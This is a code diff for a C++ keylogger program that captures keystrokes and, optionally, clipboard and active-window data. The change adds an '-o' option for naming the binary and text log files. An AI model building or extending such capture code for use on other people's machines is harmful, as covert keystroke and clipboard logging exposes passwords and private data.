@@ -45,6 +45,7 @@ available keycode maps:\n\
 ";
 
     Keylogger::IKeycodeMapper* mapper = new Keylogger::KeycodeMapperUS();
+    std::string logName = "log";
 
     bool clipboardEnable = false;
     bool keycodesLog = false;
@@ -66,6 +67,9 @@ available keycode maps:\n\
                 std::cout << help;
                 return 1;
             }
+            break;
+        case 'o':
+            logName = std::string(optarg);
             break;
         case 'w':
             windowEnable = true;
@@ -91,7 +95,7 @@ available keycode maps:\n\
             nullptr,
             clipboardEnable ? &clipboard : nullptr,
             windowEnable ? &window : nullptr,
-            "test.bin"
+            logName + ".bin"
         );
         capturer.addLogger(&loggerBin);
     }
@@ -100,7 +104,7 @@ available keycode maps:\n\
         mapper,
         clipboardEnable ? &clipboard : nullptr,
         windowEnable ? &window : nullptr,
-        "test.txt"
+        logName + ".txt"
     );
     capturer.addLogger(&logger);
 
